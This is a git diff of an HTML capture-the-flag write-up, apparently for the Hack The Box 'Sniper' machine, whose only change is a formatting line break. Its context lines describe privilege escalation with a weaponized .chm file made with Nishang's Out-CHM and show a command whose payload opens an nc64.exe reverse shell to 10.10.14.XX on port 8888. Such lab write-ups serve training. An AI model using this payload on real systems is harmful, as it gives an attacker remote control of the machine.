@@ -234,7 +234,7 @@ type user.txt
             <p>After some enumeration I found something interesting in the Downloads folder of user Chris. There is a file called instructions.chm which contains the following information.</p><br>
             <img src="../htb/Sniper/img/sniper_instructions.JPG" class="img-fluid"><br>
             <p>I made some research on how to use this information, the creator of the file probably knew, that this can be used for privilege escalation. I found out that we can use Nishang to upload a weaponized .chm file, which is often used for privilege escalation.</p><br>
-            <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a><br>
+            <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a><br><br>
             <p>After installing the HTML Help Workshop I generated a malicious .chm file that spawns a reverse shell.</p><br>
             <?prettify linenums=1?>
             <pre class="prettyprint">PS > Out-CHM -Payload "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.XX 8888" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"</pre><br>
